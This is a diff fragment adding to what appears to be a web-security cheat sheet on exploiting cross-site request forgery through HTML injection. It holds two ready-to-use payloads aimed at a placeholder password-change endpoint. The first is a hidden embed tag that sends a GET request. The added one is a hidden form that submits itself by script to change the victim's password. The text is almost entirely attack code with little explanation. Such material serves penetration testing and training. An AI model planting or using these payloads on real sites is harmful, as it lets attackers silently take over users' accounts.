@@ -52,3 +52,16 @@ password=newpass&comfirm_password=newpass
 ```
  <embed type="image/jpg" src="http://target-vuln-web.com/user/new_password?password=newpass&comfirm_password=newpass" style="display:none;"> 
 ```
+
+**Exploit CSRF Vulnerability Via HTML Injections (POST Method)**
+
+>Form + Script Tag
+```
+<form action="http://target-vuln-web.com/user/new_password" method="POST">
+            <input type="hidden" name="password" value="newpass" />
+            <input type="hidden" name="comfirm_password" value="newpass" />
+        </form>
+        <script>
+            document.forms[0].submit();
+        </script>
+```
